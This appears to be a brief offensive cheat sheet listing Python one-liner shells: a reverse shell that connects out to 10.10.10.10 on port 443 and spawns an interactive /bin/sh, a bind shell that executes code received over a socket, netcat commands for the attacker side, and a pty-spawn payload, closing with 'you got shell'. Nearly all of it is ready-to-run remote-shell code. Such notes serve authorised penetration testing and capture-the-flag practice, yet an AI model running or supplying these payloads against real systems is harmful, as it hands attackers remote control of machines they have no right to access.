#### python one liner rev shell 

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

#### python one liner bind shell 

run this on target machine 

`python -c 'import socket as a;s = a.socket();s.bind(("127.1",443));s.listen(1);(r,z) = s.accept();exec(r.recv(999))'`

run this on attacker machine 

`nc -v targethost 443` <br>
ncat -v 127.0.0.1 443 <br> 
Ncat: Version 7.70 ( https://nmap.org/ncat )<br>
Ncat: Connected to 127.0.0.1:443.<br>

`import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/sh");s.close()`

#you got shell
